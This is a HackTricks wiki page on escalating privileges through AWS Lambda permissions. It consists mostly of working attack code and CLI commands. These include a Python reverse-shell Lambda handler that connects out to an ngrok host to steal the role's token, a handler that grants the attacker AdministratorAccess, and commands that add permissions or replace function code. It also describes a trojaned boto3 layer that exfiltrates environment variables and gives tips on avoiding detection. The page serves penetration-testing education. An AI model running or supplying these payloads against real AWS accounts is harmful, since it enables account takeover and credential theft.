# AWS - Lambda Privesc

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## lambda

More info about lambda in:

{% content-ref url="../../aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

A user with the **`iam:PassRole`, `lambda:CreateFunction`,** and **`lambda:InvokeFunction`** permissions can **escalate privileges by passing an existing IAM role to a new Lambda function** that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice. The code could then be run by invoking the function through the AWS API.

A attacker could abuse this to get a **rev shell and steal the token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
   s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
   s.connect(('4.tcp.ngrok.io',14305))
   os.dup2(s.fileno(),0)
   os.dup2(s.fileno(),1)
   os.dup2(s.fileno(),2)
   p=subprocess.call(['/bin/sh','-i'])
   time.sleep(900)
   return 0
```
{% endcode %}

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
    --runtime python3.9 --role <arn_of_lambda_role> \
    --handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```

You could also **abuse the lambda role permissions** from the lambda function itself.\
If the lambda role had enough permissions you could use it to grant admin rights to you:

```python
import boto3
def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return response
```

**Potential Impact:** Direct privesc to the arbitrary lambda service role specified.

{% hint style="danger" %}
Note that even if it might looks interesting **`lambda:InvokeAsync`** **doesn't** allow on it's own to **execute `aws lambda invoke-async`**, you also need `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Like in the previous scenario, you can **grant yourself the `lambda:InvokeFunction`** permission if you have the permission **`lambda:AddPermission`**

```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
   --action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```

**Potential Impact:** Direct privesc to the arbitrary lambda service role specified.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

A user with the **`iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping`** (and possibly `dynamodb:PutItem` and `dynamodb:CreateTable`) permissions, but **without** the `lambda:InvokeFunction` permission, can escalate privileges by **passing an existing IAM role to a new Lambda function** that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice. They then would need to either **create a DynamoDB table or use an existing one**, to **create an event source mapping for the Lambda function pointing to that DynamoDB table**. Then they would need to either put an item into the table or wait for another method to do so that the **Lambda function will be invoked**.

```bash
aws lambda create-function --function-name my_function \
    --runtime python3.8 --role <arn_of_lambda_role> \
    --handler lambda_function.lambda_handler \
    --zip-file fileb://rev.zip
```

Where the **code** in the python file would **utilize the targeted role**. An example would be the same script used in previous method.

After this, the next step depends on **whether DynamoDB is being used** in the current AWS environment. **If** it is being **used**, all that needs to be done is **creating the event source mapping** for the Lambda function, but if not, then the attacker will need to **create a table with streaming enabled** with the following command:

```bash
aws dynamodb create-table --table-name my_table \
    --attribute-definitions AttributeName=Test,AttributeType=S \
    --key-schema AttributeName=Test,KeyType=HASH \
    --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
    --stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```

After this command, the attacker would **connect the Lambda function and the DynamoDB table** by **creating an event source mapping** with the following command:

```bash
aws lambda create-event-source-mapping --function-name my_function \
    --event-source-arn <arn_of_dynamodb_table_stream> \
    --enabled --starting-position LATEST
```

Now that the Lambda function and the stream are connected, the attacker can i**nvoke the Lambda function by triggering the DynamoDB stream**. This can be done by putting an item into the DynamoDB table, which will trigger the stream, using the following command:

```bash
aws dynamodb put-item --table-name my_table \
    --item Test={S="Random string"}
```

At this point, the Lambda function will be invoked, and the attacker will be made an administrator of the AWS account.

**Potential Impact:** Direct privesc to the lambda service role specified.

### `lambda:AddPermission`

An attacker with this permission can **grant himself (or others) any permissions** (this generates resource based policies to grant access to the resource):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Potential Impact:** Direct privesc to the lambda service role used by granting permission to modify the code and run it.

### `lambda:UpdateFunctionCode`

An attacker with the **`lambda:UpdateFunctionCode`** permission could **update the code in an existing Lambda function with an IAM role attached** so that it would import the relevant AWS library in that programming language and use it to perform actions on behalf of that role. They would then need to **wait for it to be invoked if they were not able to do so directly**, but if it already exists, there is likely some way that it will be invoked.

```bash
aws lambda update-function-code --function-name target_function \
    --zip-file fileb:///my/lambda/code/zipped.zip

aws lambda invoke --function-name my_function output.txt
```

Where the associated **.zip file contains code that utilizes the Lambda‚Äôs role**. An example could include the code snippet from previous methods.

**Potential Impact:** Direct privesc to the lambda service role used.

### `lambda:UpdateFunctionConfiguration`

#### Introduction

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) allows to include **code** in your lamdba function but **storing it separately**, so the function code can stay small and **several functions can share code**.

Inside lambda you can check the paths from where python code is loaded with a function like the following:

```python
import json
import sys

def lambda_handler(event, context):
    print(json.dumps(sys.path, indent=2))
```

These are the places:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

For example, the library boto3 is loaded from `/var/runtime/boto3` (4th position).

#### Exploitation

**Attaching a layer to a function** only requires the `lambda:UpdateFunctionConfiguration` permission and **layers can be shared cross-account**. We also would need to know **what libraries they are using**, so we can override them correctly, but in this example, we‚Äôll just **assume the attacked function is importing boto3**.

Just to be safe, we‚Äôre going to use Pip to install the same version of the boto3 library from the Lambda runtime that we are targeting (Python 3.7), just so there is nothing different that might cause problems in the target function. That runtime currently uses boto3 version 1.9.42.

With the following code, we‚Äôll install boto3 version 1.9.42 and its dependencies to a local "lambda\_layer" folder:

```
pip3 install -t ./lambda_layer boto3==1.9.42
```

Next, we will open `/lambda_layer/boto3/__init__.py` and add the malicious code. The payload we will be adding looks like this:

![](<../../../../.gitbook/assets/image (26).png>)

`requests` is being imported from `botocore`. The function will exfiltrate en env variables, and the try-except and 0.1 timeout are there to ensure this code doesn't break anything.

{% hint style="info" %}
**Important note:** You should no longer `from botocore.vendored import requests` in real pentests, because a ‚ÄúDeprecationWarning‚Äù will be printed to the CloudWatch logs of that function, which will likely cause you to get caught by a defender.
{% endhint %}

Now, bundle that code into a **ZIP file** and **upload** it to a **new Lambda layer in the ATTACKER account**. You will need to create a ‚Äúpython‚Äù folder first and put your libraries in there so that once we upload it to Lambda, the code will be found at ‚Äú/opt/python/boto3‚Äù. Also, make sure that the layer is compatible with Python 3.7 and that the **layer is in the same region as our target function**. Once that‚Äôs done, we‚Äôll use `lambda:AddLayerVersionPermission` to **make the layer publicly accessible** so that our target account can use it. Use your personal AWS credentials for this API call.

```bash
aws lambda add-layer-version-permission --layer-name boto3 \
    --version-number 1 --statement-id public \
    --action lambda:GetLayerVersion --principal *
```

Now with the **compromised credentials** we have, we will run the following command on our target Lambda function ‚Äús3-getter‚Äù, which will **attach our cross-account Lambda layer**.

```
aws lambda update-function-configuration \
    --function-name s3-getter \
    --layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```

The next step would be to either **invoke the function** ourselves if we can or to wait until i**t gets invoked** by normal means‚Äìwhich is the safer method.

**Potential Impact:** Direct privesc to the lambda service role used.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Maybe with those permissions you are able to create a function and execute it calling the URL... but I could find a way to test it, so let me know if you do!

### Lambda MitM

Some lambdas are going to be **receiving sensitive info from the users in parameters.** If get RCE in one of them, you can exfiltrate the info other users are sending to it, check it in:

{% content-ref url="aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](aws-warm-lambda-persistence.md)
{% endcontent-ref %}

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
